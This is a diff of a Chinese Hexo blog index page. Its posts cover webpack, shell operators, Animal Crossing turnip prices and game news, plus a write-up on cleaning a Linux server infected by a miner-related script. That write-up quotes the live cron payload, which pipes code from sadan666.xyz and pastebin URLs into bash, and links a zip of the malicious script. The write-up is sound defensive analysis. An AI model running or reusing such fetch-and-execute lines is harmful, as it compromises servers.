@@ -29,22 +29,18 @@
   
 <link rel="stylesheet" href="/css/style.css">
 
-<meta name="generator" content="Hexo 4.2.1"></head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
 <body>
   <div id="container">
     <div id="wrap">
       <header id="header">
-  <a href="https://www.pixiv.net/artworks/90437941" target="_blank" rel="noopener"><div id="banner"></div></a>
+  <a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/90437941"><div id="banner"></div></a>
   <div id="header-outer" class="outer">
     <div id="header-title" class="inner">
       <h1 id="logo-wrap">
         <a href="/" id="logo">集合</a>
       </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">万物终归一站</a>
-        </h2>
       
     </div>
     <div id="header-inner" class="inner">
@@ -93,7 +89,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="webpack速览知识"><a href="#webpack速览知识" class="headerlink" title="webpack速览知识"></a>webpack速览知识</h1><h2 id="1-webpack是什么"><a href="#1-webpack是什么" class="headerlink" title="1. webpack是什么"></a>1. webpack是什么</h2><p>&emsp;按照官方的定义：webpack是一种静态资源的打包器。比如说有两个模块都通过CJS或者是ESM引入了一些js库，通过webpack就可以将引入的这些js库打包到bundle中去。再比如，要通过require的方式引入一个非js的文件，也可以通过webpack来转换为可以让其直接引用的模块<br><br/><br><img src="https://static.xiaoblogs.cn/img/20210708121523.png" alt=""><br><br/></p>
+        <h1 id="webpack速览知识"><a href="#webpack速览知识" class="headerlink" title="webpack速览知识"></a>webpack速览知识</h1><h2 id="1-webpack是什么"><a href="#1-webpack是什么" class="headerlink" title="1. webpack是什么"></a>1. webpack是什么</h2><p>&emsp;按照官方的定义：webpack是一种静态资源的打包器。比如说有两个模块都通过CJS或者是ESM引入了一些js库，通过webpack就可以将引入的这些js库打包到bundle中去。再比如，要通过require的方式引入一个非js的文件，也可以通过webpack来转换为可以让其直接引用的模块<br><br/><br><img src="https://static.xiaoblogs.cn/img/20210708121523.png"><br><br/></p>
 <h2 id="2-webpack中的入口input、出口output、loader、plugin各个都是些什么"><a href="#2-webpack中的入口input、出口output、loader、plugin各个都是些什么" class="headerlink" title="2. webpack中的入口input、出口output、loader、plugin各个都是些什么"></a>2. webpack中的入口input、出口output、loader、plugin各个都是些什么</h2><blockquote>
 <p>入口input：webpack构建模块依赖图的起点，webpack会从这里开始打包模块需要的静态资源文件  </p>
 <p>出口output：webpack打包后的bundle的输出位置和名字 </p>
@@ -105,7 +101,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/webpack%E7%AF%87/" data-id="ckqv2rh0t002besvsag538s8r" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/webpack%E7%AF%87/" data-id="ckqvbhfvk0032bwvs9sgp7v71" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webpack/" rel="tag">webpack</a></li></ul>
@@ -144,7 +140,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="如果在shell中执行这样的命令输出是什么呢？"><a href="#如果在shell中执行这样的命令输出是什么呢？" class="headerlink" title="如果在shell中执行这样的命令输出是什么呢？"></a>如果在shell中执行这样的命令输出是什么呢？</h2><p>假设下面命令中的两个文件都存在</p>
-<pre><code>root@ali_server:~# cat file1||cat file2   </code></pre><p>答案：</p>
+<pre><code>root@ali_server:~# cat file1||cat file2   
+</code></pre>
+<p>答案：</p>
 <style>
   .heimu{ background-color: #252525; color: #252525; text-shadow: none; } .heimu:hover{ transition: color .13s linear; color: #fff; }
 </style>
@@ -154,7 +152,9 @@
 <p>为什么会这样呢？“||”的意思不是或者吗，没错，但是<strong>在Linux中是先执行||前面的命令也就是例子中的cat file1如果执行失败会执行后面的cat file2</strong>，并且都要先执行第一个命令，无论成功或者失败</p>
 <p>cat a成功后就执行第一个cat a<br>a1不存在，但是也会执行这个命令，之后执行后面的cat a</p>
 <p>同样还是file1和file2，如果执行下面的命令</p>
-<pre><code>root@ali_server:~# cat file1&amp;&amp;cat file2</code></pre><p>答案：</p>
+<pre><code>root@ali_server:~# cat file1&amp;&amp;cat file2
+</code></pre>
+<p>答案：</p>
 <div class="heimu">会输出file1和file2的内容</div> 
 <br /> 
 
@@ -163,7 +163,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/linux-e4-b8-ad-e7-9a-84-e5-92-8c/" data-id="ckqv2rh0u002eesvs1tgugewx" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/linux-e4-b8-ad-e7-9a-84-e5-92-8c/" data-id="ckqvbhfvh002xbwvsb336g8e0" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4/" rel="tag">Linux中的命令</a></li></ul>
@@ -201,16 +201,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>首先放一个老友的连接：<a href="http://yuyy.info" target="_blank" rel="noopener">http://yuyy.info</a></p>
+        <p>首先放一个老友的连接：<a target="_blank" rel="noopener" href="http://yuyy.info/">http://yuyy.info</a></p>
 <p>恶意程序名称：</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-7.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-7.png"></p>
 <p>可能是这个</p>
 <p>最近的日子正是毕业的日子，也是最忙的日子。老友给我发了条信息</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-1.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-1.png"></p>
 <p>我去，怎么就中招了呢</p>
 <p>通过ssh登录老友的服务器，<strong>发现登录的时候要卡很久，通过强制中断ctrl+c才能看见用户提示符</strong></p>
 <p>用top命令查看下现阶段运行进程情况，top命令简单说就是监控Linux中运行的进程的在系统中情况</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-2.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-2.png"></p>
 <p>好家伙</p>
 <p>通常的这些恶意进程是无法直接通过kill杀死的，有保护进程或者说有定时任务会重启什么的。</p>
 <p>既然看见了这个进程，就进入/proc/$proc_num(进程号)/中cat里面的exe文件，这个文件夹是内存中运行的进程的地方，找到这个图中的“1056”号文件夹，cat这个exe，这个文件直接指向可执行程序。</p>
@@ -223,7 +223,7 @@
 <p>最基本的操作，改root用户密码，停止redis服务。我是将我好友上面的apache，mysql，nginx等服务都停止了。防止恶意程序会再扫描服务器漏洞进行入侵。</p>
 <p>下一步操作，进入阿里云的实例控制台中的防火墙，或者安全策略</p>
 <p>禁用一些不需要的端口</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-5-1024x137.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-5-1024x137.png"></p>
 <p>切记不要图方便开启xxxx-xxxx号端口的危险行为</p>
 <p>之后，我前面已经提到了，关闭一些服务</p>
 <p>找到这个脚本</p>
@@ -231,38 +231,52 @@
 <p>进程隐藏的方式的恶意程序要比这次对付的程序强大的多，这个先不提及</p>
 <p>因为直接cat定时任务crontab很快速就先看了</p>
 <p>来看看服务器中可怜的定时任务</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-10.png" alt=""></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-11.png" alt=""></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-12.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-10.png"></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-11.png"></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-12.png"></p>
 <p>并且，在bin目录下，也生成了两个可执行的sh</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-15.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-15.png"></p>
 <p>可以见到还上锁了</p>
 <p>内容如下：</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-16-1024x90.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-16-1024x90.png"></p>
 <p>可见会从不同的url下载恶意程序</p>
 <p>这里说明下，如果要解锁一个文件，要用下面的命令</p>
-<pre><code>chattr -i xxx</code></pre><p>同时有一个定时文件是定时执行这两个文件</p>
+<pre><code>chattr -i xxx
+</code></pre>
+<p>同时有一个定时文件是定时执行这两个文件</p>
 <p><strong>这里要注意一点，因为有些恶意程序会劫持命令，比如rm命令会给你换名字，或者不会让你执行</strong></p>
 <p>如果有这种情况，可以使用busybox，busybox相当于一个集成命令的工具，里面有一些常用的命令，使用busybox的时候只要加上这个工具名字的前缀就可</p>
-<pre><code>busybox rm xxx</code></pre><p>cat出定时任务，可以看到下面的内容</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-6.png" alt=""></p>
+<pre><code>busybox rm xxx
+</code></pre>
+<p>cat出定时任务，可以看到下面的内容</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-6.png"></p>
 <p>有点小</p>
-<pre><code>sed -i &apos;/aziplcr72qjhzvin/d&apos; /etc/hosts; (python -c &apos;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&apos;||curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash</code></pre><p>第一部分：</p>
-<pre><code>sed -i &apos;/aziplcr72qjhzvin/d&apos; /etc/hosts;</code></pre><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-9.png" alt=""></p>
+<pre><code>sed -i &#39;/aziplcr72qjhzvin/d&#39; /etc/hosts; (python -c &#39;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&#39;||curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash
+</code></pre>
+<p>第一部分：</p>
+<pre><code>sed -i &#39;/aziplcr72qjhzvin/d&#39; /etc/hosts;
+</code></pre>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-9.png"></p>
 <p>。。</p>
 <p>往hosts文件中写东西，是加密的。主要就是将0.0.0.0解析到一个网址</p>
 <p>第二部分：</p>
-<pre><code>python -c &apos;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&apos;</code></pre><p>使用urllib2库来执行一条python语句，打开后面那个网址</p>
+<pre><code>python -c &#39;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&#39;
+</code></pre>
+<p>使用urllib2库来执行一条python语句，打开后面那个网址</p>
 <p>第三部分：</p>
-<pre><code>curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash</code></pre><p>都是从后面那个url中curl和wget一段经过base64加密的脚本之后执行，注意里面的选项都是启用了静默模式的，不会有任何输出，所以我们无法通过日志等文件查看这两条命令的执行记录</p>
+<pre><code>curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash
+</code></pre>
+<p>都是从后面那个url中curl和wget一段经过base64加密的脚本之后执行，注意里面的选项都是启用了静默模式的，不会有任何输出，所以我们无法通过日志等文件查看这两条命令的执行记录</p>
 <p>所以，有了这个，找到脚本不难，但不是说在服务器上找，而是我们直接请求他的url获得脚本</p>
-<pre><code>(curl -fsSL https://pastebin.com/raw/UhUmR517||wget -q -O - https://pastebin.com/raw/UhUmR517)|sed &apos;s/\r//&apos;</code></pre><p>这里的url和上面的不同，这里的url是从其他定时任务文件中得到的，上面有截图显示这个url，但是他们指向的都是一个恶意脚本</p>
+<pre><code>(curl -fsSL https://pastebin.com/raw/UhUmR517||wget -q -O - https://pastebin.com/raw/UhUmR517)|sed &#39;s/\r//&#39;
+</code></pre>
+<p>这里的url和上面的不同，这里的url是从其他定时任务文件中得到的，上面有截图显示这个url，但是他们指向的都是一个恶意脚本</p>
 <p>将得到的bash64结果放到在线的解码器中</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-8.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-8.png"></p>
 <p>这就找到这个脚本了</p>
 <p>这里我将脚本放到这里供大家参考</p>
 <p>PS.wp不支持sh文件上传，就上传txt了，我已经将里面的一些部分更改，以防意外</p>
-<p><a href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip" target="_blank" rel="noopener">wakuang</a><a href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip" target="_blank" rel="noopener">下载</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip">wakuang</a><a target="_blank" rel="noopener" href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip">下载</a></p>
 <p>通过这个文件的分析，能得到所有的cron定时任务文件都被写入了上面的命令，会在每时每刻都会执行上面的命令，获取到这个可执行的脚本，之后执行这个脚本删除它，脚本中再往定时任务，root的.bashrc文件中写入上述的命令。如果我们只是单纯的kill到那个恶意进程，定时任务会立刻执行重新下载脚本并执行，如果我们将定时任务中的任务删除，当我们每次通过ssh登录服务器时，会执行.bashrc文件，又开始了死循环</p>
 <p><strong>删除它</strong></p>
 <p>好的，我们已经简单的分析下，那么我们改怎么处理呢？难道说通过拼手速的方式？</p>
@@ -273,17 +287,17 @@
 <p><strong>第四步</strong>：清理定时任务文件，并且要清理.bashrc下面写入的下载恶意脚本命令，要不然下次连接服务器就又会执行下载命令</p>
 <p><strong>第五步</strong>：查看有没有可疑进程等</p>
 <p>我这边直接top了下，服务器恢复了正常</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-13.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-13.png"></p>
 <p><strong>总结</strong></p>
 <p>基本来说，这是一次正式挖矿前的清理服务器其他挖矿程序和注入自己恶意程序的操作。并不是正真的挖矿程序</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-14.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/image-14.png"></p>
 <p>恶意程序其中的一部分</p>
 <p>上图可以见到这个恶意脚本会kill一些其他的挖矿脚本，之后就是上述提到的步骤。我通过分析这个脚本并没有找到挖矿程序。通过top分析也没有进程占用异常的资源的情况，所以，我仅觉得是挖矿前的“清理”，同行的恶意竞争？？笑~</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/e8-ae-b0-e4-b8-80-e6-ac-a1-e8-80-81-e5-8f-8b-e7-9a-84linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e8-a2-ab-e6-81-b6-e6-84-8f-e7-a8-8b-e5-ba-8f-e5-85-a5-e4-be-b5-e5-b9-b6-e8-a7-a3-e5-86-b3-e7-9a-84-e8-bf-87/" data-id="ckqv2rh1j003yesvseif8amww" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/e8-ae-b0-e4-b8-80-e6-ac-a1-e8-80-81-e5-8f-8b-e7-9a-84linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e8-a2-ab-e6-81-b6-e6-84-8f-e7-a8-8b-e5-ba-8f-e5-85-a5-e4-be-b5-e5-b9-b6-e8-a7-a3-e5-86-b3-e7-9a-84-e8-bf-87/" data-id="ckqvbhfur000qbwvshjn56so5" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E5%85%A5%E4%BE%B5Linux%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">恶意入侵Linux服务器</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8C%96%E7%9F%BF/" rel="tag">挖矿</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/" rel="tag">运维安全</a></li></ul>
@@ -321,29 +335,29 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>原文链接：<a href="https://xw.qq.com/cmsid/20200403A0S9X500" target="_blank" rel="noopener">https://xw.qq.com/cmsid/20200403A0S9X500</a></p>
-<p><img src="https://inews.gtimg.com/newsapp_bt/0/11536401468/641" alt=""></p>
+        <p>原文链接：<a target="_blank" rel="noopener" href="https://xw.qq.com/cmsid/20200403A0S9X500">https://xw.qq.com/cmsid/20200403A0S9X500</a></p>
+<p><img src="https://inews.gtimg.com/newsapp_bt/0/11536401468/641"></p>
 <p>先上个曹卖图首先以下说明全部都是NS动森(Animal Crossing: New Horizon)解包出来的数据，与版上有人PO的3DS数据只有少许出入，如果你已经看过3DS版也不想多花时间的话，可以直接跳过这篇说明了。再来要感谢Ninji将这次控制大头菜价格的code解包出来(推特链接)有兴趣的可以进去看大头菜价格是怎么写的。tl;dr: 直接用以下链接计算预测大头菜价格即可(由Reddit网友/u/mikebryantuk制作)大头菜价格预测工具以下正文是根据网友/u/Edricus写的Breaking Down the Stalk Market翻译并根据解包code修正内文的错误之处最后是这篇是写给像我这种边缘人看的，有朋友的话直接到有好价钱的朋友岛上卖出即可。正文开始(只想看判断方式与简表的话可以直接跳到四，晚点补上)</p>
 <p><strong>一、基础价格</strong>：为玩家在周日所购入的大头菜价格，在模型预测中占有重要地位。大头菜的购入价格必在(90,110)的区间中乱数决定，即大头菜价格一定是90-110铃钱。举例：周日跟曹卖买大头菜1颗100铃钱，从明天(周一)起至周六的基础价格皆为100铃钱。不会因为你跑去别人岛上买较便宜的大头菜而改变，直到下周日曹卖再次出现才会改变。</p>
 <p><strong>二、售价模型：</strong></p>
 <p>1.模型种类本次大头菜价格波动共有4种模型，分别为0 – 波型(Random)1 – 三期型(Large Spike)</p>
 <p>2 – 递减型(Decreasing)</p>
-<p>3 – 四期型(Small Spike)每周玩家皆会被系统指派一种售价模型，直到下次曹卖出现才会再次更动模型，为期7天。并且玩家本周的售价模型会影响下周的售价模型机率，具体如下<img src="https://inews.gtimg.com/newsapp_bt/0/11536401469/641" alt=""></p>
+<p>3 – 四期型(Small Spike)每周玩家皆会被系统指派一种售价模型，直到下次曹卖出现才会再次更动模型，为期7天。并且玩家本周的售价模型会影响下周的售价模型机率，具体如下<img src="https://inews.gtimg.com/newsapp_bt/0/11536401469/641"></p>
 <p>举例：如果玩家本周价格模型为三期型，下周将有50％机会变为波型、5％机会变三期型、20％机会变为波型、25％机会变为四期型。2. 期(Phases)每周我们可以把每次价格变动时间区分开来，一天2期一周共可分为14期。每期的长度为12小时。每天的12AM与12PM会进入下一期并更新卖价。因为商店是从8AM开到10PM，所以一天实际上能卖的期间只能分为上半期(8AM-12PM)4小时，与下半期(12PM-10PM)10小时。有趣的是周日的两期虽然无法卖菜，但在代码中是有给予售价的，都是卖0铃钱，实际上能卖菜的只有12期。</p>
-<p><strong>三、各模型细节</strong>以下模型解释中，各种举例为方便计算我们假设基础价格为100铃钱。1.波型波型中我们可以把价格变动区分成2大阶段，分别为下跌阶段上涨阶段每周皆固定会有2次的下跌阶段与3次的上涨阶段<strong>各阶段的持续时间表</strong>(以下为方便理解我们将1期称为1个半天)<img src="https://inews.gtimg.com/newsapp_bt/0/11536401470/641" alt=""></p>
-<p>各阶段发生的时序固定为上涨阶段1 – 下跌阶段1 – 上涨阶段2 – 下跌阶段2 – 上涨阶段3<strong>各阶段的价钱算法表</strong>(以下所有与铃钱有关计算皆为计算后无条件进位至下个整数)<img src="https://inews.gtimg.com/newsapp_bt/0/11536401471/641" alt=""></p>
-<p><strong>此模型重点</strong>最好价格为买价的1.4倍，最差价格为买价的0.9倍以基础价格100铃钱来说，就是140与90铃钱<strong>TIPS</strong>如果发现是波型请赶快在价格好时售出虽然机率很低，但最坏情况有可能都不会超过买价。2. 三期型最刺激好赚的模型，要发大财就要靠这个各阶段的持续时间表<img src="https://inews.gtimg.com/newsapp_bt/0/11536401472/641" alt=""></p>
-<p>各阶段发生的时序固定为下跌阶段 – 暴涨阶段 – 暴跌阶段 – 乱数下跌阶段各阶段的价钱算法表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402498/641" alt=""></p>
-<p><strong>此模型重点</strong>此模型可以算出收购大头菜的最高价为110<em>600％ ＝ 660铃钱*</em>TIPS**此模型开始与递减型一模一样，也与第四期很相似如果发现开始涨价，并且开始涨价的第2个半天涨超过140％请务必在下个半天卖掉。3.递减型最浅显易懂的模型，一定不会赚钱。各阶段的持续时间表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402499/641" alt=""></p>
-<p>各阶段的价钱算法表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402500/641" alt=""></p>
-<p><strong>此模型重点</strong>没有重点，块陶<strong>TIPS</strong>此模型开始与三期型一模一样，第8个半天(礼拜四下午)还没涨的话请赶快想办法卖掉。3.四期型虽然不像三期型那么爽，但也不失为一个赚钱的好机会。各阶段的持续时间表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402501/641" alt=""></p>
-<p>各阶段发生的时序固定为下跌阶段1 – 上涨阶段 – 下跌阶段2各阶段的价钱算法表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402502/641" alt=""></p>
+<p><strong>三、各模型细节</strong>以下模型解释中，各种举例为方便计算我们假设基础价格为100铃钱。1.波型波型中我们可以把价格变动区分成2大阶段，分别为下跌阶段上涨阶段每周皆固定会有2次的下跌阶段与3次的上涨阶段<strong>各阶段的持续时间表</strong>(以下为方便理解我们将1期称为1个半天)<img src="https://inews.gtimg.com/newsapp_bt/0/11536401470/641"></p>
+<p>各阶段发生的时序固定为上涨阶段1 – 下跌阶段1 – 上涨阶段2 – 下跌阶段2 – 上涨阶段3<strong>各阶段的价钱算法表</strong>(以下所有与铃钱有关计算皆为计算后无条件进位至下个整数)<img src="https://inews.gtimg.com/newsapp_bt/0/11536401471/641"></p>
+<p><strong>此模型重点</strong>最好价格为买价的1.4倍，最差价格为买价的0.9倍以基础价格100铃钱来说，就是140与90铃钱<strong>TIPS</strong>如果发现是波型请赶快在价格好时售出虽然机率很低，但最坏情况有可能都不会超过买价。2. 三期型最刺激好赚的模型，要发大财就要靠这个各阶段的持续时间表<img src="https://inews.gtimg.com/newsapp_bt/0/11536401472/641"></p>
+<p>各阶段发生的时序固定为下跌阶段 – 暴涨阶段 – 暴跌阶段 – 乱数下跌阶段各阶段的价钱算法表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402498/641"></p>
+<p><strong>此模型重点</strong>此模型可以算出收购大头菜的最高价为110*600％ ＝ 660铃钱<strong>TIPS</strong>此模型开始与递减型一模一样，也与第四期很相似如果发现开始涨价，并且开始涨价的第2个半天涨超过140％请务必在下个半天卖掉。3.递减型最浅显易懂的模型，一定不会赚钱。各阶段的持续时间表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402499/641"></p>
+<p>各阶段的价钱算法表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402500/641"></p>
+<p><strong>此模型重点</strong>没有重点，块陶<strong>TIPS</strong>此模型开始与三期型一模一样，第8个半天(礼拜四下午)还没涨的话请赶快想办法卖掉。3.四期型虽然不像三期型那么爽，但也不失为一个赚钱的好机会。各阶段的持续时间表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402501/641"></p>
+<p>各阶段发生的时序固定为下跌阶段1 – 上涨阶段 – 下跌阶段2各阶段的价钱算法表<img src="https://inews.gtimg.com/newsapp_bt/0/11536402502/641"></p>
 <p><strong>此模型重点</strong>相当平均的模型，容易在早期发现，也可以卖到上限2倍买价的钱，不错。<strong>TIPS</strong>只要第1个半天(周一上午)跌超过15％就一定是四期型，虽然机率低但也有万一一开始就近入上涨阶段，会与波型十分相似，分别重点是第3个半天(周二上午)，如果有涨超过1.4倍则必为四期型，请务必等到上涨阶段的第4个半天将大头菜卖掉。<strong>四、结论</strong>从以上讨论可以得知大头菜的买价必为90-110铃钱且可以预测并在最好的时机将菜卖出，也可以得知大头菜最好与最坏的收购价。最好：三期型，基础价格110，股神有机会卖到一颗660铃钱。最差：四期型，基础价格90，有可能惨到一颗9铃钱，但四期型一定会涨回来，无须担忧。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/e5-a4-a7-e5-a4-b4-e8-8f-9c-e4-bb-b7-e6-a0-bc-e5-ae-8c-e5-85-a8-e6-94-bb-e7-95-a5/" data-id="ckqv2rh02000iesvseuczfxpk" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/e5-a4-a7-e5-a4-b4-e8-8f-9c-e4-bb-b7-e6-a0-bc-e5-ae-8c-e5-85-a8-e6-94-bb-e7-95-a5/" data-id="ckqvbhfui0007bwvsddd0dlat" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8A%A8%E6%A3%AE/" rel="tag">动森</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8A%A8%E7%89%A9%E6%A3%AE%E5%8F%8B%E4%BC%9A/" rel="tag">动物森友会</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%A7%E7%99%BD%E8%8F%9C%E6%94%BB%E7%95%A5%E6%9C%80%E8%AF%A6%E7%BB%86/" rel="tag">大白菜攻略最详细</a></li></ul>
@@ -381,20 +395,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>来源：<a href="https://3g.ali213.net/news/html/506629.html" target="_blank" rel="noopener">https://3g.ali213.net/news/html/506629.html</a></p>
+        <p>来源：<a target="_blank" rel="noopener" href="https://3g.ali213.net/news/html/506629.html">https://3g.ali213.net/news/html/506629.html</a></p>
 <p>2020-04-30 18:54来源：互联网</p>
 <p>　　近日，据外媒the Gamer报道，《集合啦！动物森友会》在前段时间的更新中下调了存款利率，这次的调整还让《动森》登上了《金融时报》的头版。来了解一下吧！</p>
-<p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_dd1506ce546c40abbd336a3ef1e1daf1.png" alt=""></p>
+<p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_dd1506ce546c40abbd336a3ef1e1daf1.png"></p>
 <p>　　尽管《集合啦！动物森友会》近期销量惊人，但本次它却是凭借着Nook银行的利率调整登上了《金融时报》的头版报道：在4月23日的更新当中，Nook银行调低了存款利率（从原本的0.5%削减到了不到0.05%），另外玩家获取的利息上限也被限制在了9999铃。《金融时报》因此发布了一篇名为“虚拟利息降低迫使任天堂玩家转向更高风险的资产”的报道。</p>
-<p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_2020043052640163.jpg" alt=""></p>
+<p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_2020043052640163.jpg"></p>
 <p>　　报道称，Nook银行的这番操作有可能是为了对抗某些“时空旅行”玩家将时间快转到月底获取大量利息收益的行为（任天堂对此并未发表官方回应）；不过此番调整也恰好与多国央行的操作类似：近期多国政府也为了应对新冠状病毒带来的影响下调了存款利率。</p>
-<p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_e5bda46077025ab168dab54291b26c5e.png" alt=""></p>
+<p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_e5bda46077025ab168dab54291b26c5e.png"></p>
 <p>　　法国兴业银行战略家Albert Edwards在接受《财经时报》采访时还开玩笑地表示：“现在（Nook银行）已将利率降至接近0，他们下一个合乎逻辑的举动就是采取量化宽松措施。”他还开玩笑说，玩家们应该把游戏连上打印机，因为接下来他们可能就要开始赚钱了。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/e3-80-8a-e5-8a-a8-e6-a3-ae-e3-80-8b-e7-99-bb-e4-b8-8a-e3-80-8a-e9-87-91-e8-9e-8d-e6-97-b6-e6-8a-a5-e3-80-8b-e5-a4-b4-e7-89-88-e5-9b-a0nook-e9-93-b6-e8-a1-8c-e5-88-a9-e7-8e-87-e4-b8-8b-e8-b0-83/" data-id="ckqv2rgzy0009esvs250bg7m8" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/e3-80-8a-e5-8a-a8-e6-a3-ae-e3-80-8b-e7-99-bb-e4-b8-8a-e3-80-8a-e9-87-91-e8-9e-8d-e6-97-b6-e6-8a-a5-e3-80-8b-e5-a4-b4-e7-89-88-e5-9b-a0nook-e9-93-b6-e8-a1-8c-e5-88-a9-e7-8e-87-e4-b8-8b-e8-b0-83/" data-id="ckqvbhfue0003bwvsalsdb7un" class="article-share-link">Share</a>
       
       
